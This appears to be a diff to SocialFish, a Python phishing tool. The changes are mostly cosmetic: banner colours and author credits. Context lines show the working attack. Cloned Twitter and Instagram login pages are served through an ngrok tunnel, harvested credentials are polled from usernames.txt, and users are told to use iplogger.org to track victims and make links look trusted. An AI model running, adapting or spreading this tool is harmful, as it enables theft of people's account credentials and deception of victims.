@@ -3,13 +3,14 @@
 #   SOCIALFISH v2.0
 #     by: An0nUD4Y
 #
-###########################
+# TERMUX VERSION OF SOCIALFISH
+###############################
 from time import sleep
 from sys import stdout, exit
 from os import system, path
 import multiprocessing
 from urllib import urlopen
-from platform import system as systemos, architecture
+from platform import architecture
 from wget import download
 
 RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
@@ -27,6 +28,7 @@ if connected() == False:
       \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
           \|           
                     {0}[{1}!{0}]{1} Network error. Verify your connection.\n
+                    {0}[{1}!{0}]{1} By--------------> An0nUD4Y \n
 '''.format(RED, END)
      exit(0)
 
@@ -55,12 +57,9 @@ def end():
               |  /    / / / / / / /   |__\   <     {1}FORGET{2}   )
               |/     / / / / / / /             \_   {1}ME !{2}  _)
                           {1}F I S H{2}                ~--___--~
-
  {0}This script was made by UndeadSec_ But I have added some more features in it ]
-
 {1}[ {0} Some more phising pages have been added in script. For a better Attack]
-
-[ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(GREEN, END, CYAN)
+[ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(RED, END, CYAN)
 
 def loadModule(module):
        print '''{0}
@@ -70,7 +69,7 @@ def loadModule(module):
  `=.____.="  `._\\
 
 
- [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module
+ [{1}*{0}]{1} %s module loaded.{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
     system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt')
@@ -99,7 +98,7 @@ def runPhishing(social, option2):
     elif social == 'Twitter':
         system('cp WebPages/twitter/*.* Server/www/')
     elif option2 == '1' and social == 'Instagram':
-        system('cp WebPages/Instagram_web/*.* Server/www/')    
+        system('cp WebPages/Instagram_web/*.* Server/www/')
 
 def waitCreds():
     print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
@@ -109,25 +108,22 @@ def waitCreds():
  .'       "-.,' / 
 (  AnonUD4Y_  ~.< 
  `=.____.="  `._\\
-
-
  [{1}*{0}]{1} Do you need more help to make your ngrok link more trusted. 
  [{1}*{0}]{1} Just visit to [https://iplogger.org]
  [{1}*{0}]{1} This will help you to trace your victims by their ip address on real time. 
  [{1}*{0}]{1} And make your ngrok link more trusted type.{0}'''.format(CYAN, END)
-   
-    print " {0}[{1}*{0}]{1} Waiting for credentials... \n".format(RED, END)
+    print " {0}[{1}*{0}]{1} Waiting for credentials... \n".format(GREEN, END)
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
+            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(RED, END) % lines
             system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
         creds.close()
 
 def runPEnv():
     system('clear')
-    print '''           {2}-{1} An0nUD4Y {2}|{1} An0nUD4Y {2}|{1} An0nUD4Y {2}- INDIA
+    print ''' {2}-{1} An0nUD4Y {2}|{1} An0nUD4Y {2}|{1} An0nUD4Y {2}- INDIA
                           '
                         '   '
                       '       '
@@ -142,7 +138,8 @@ def runPEnv():
          '  .                     .     '          '     '  {1}v2.0{2} 
                '  .  .  .  .  . '.    .'              '  .
                    '         '    '. '      {1}Updated_By--> AnonUD4Y_{2}    
-                     '       '      '             
+                     '       '      '    
+                      '      '             {1}https://github.com/An0nUD4Y{2}     
                        ' .  '
                            '
                              {1}'''.format(GREEN, END, CYAN)
@@ -195,15 +192,15 @@ def runPEnv():
         loadModule('Instagram')
         option2 =raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
         runPhishing('Instagram', option2)    
-    else:  
-         exit(0)
+    else:
+        exit(0)
 
 def runNgrok():
     system('./Server/ngrok http 8080 > /dev/null &')
     sleep(10)
     system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
-    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(RED, END, CYAN)
+    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
     url.close()
 
 def runServer():
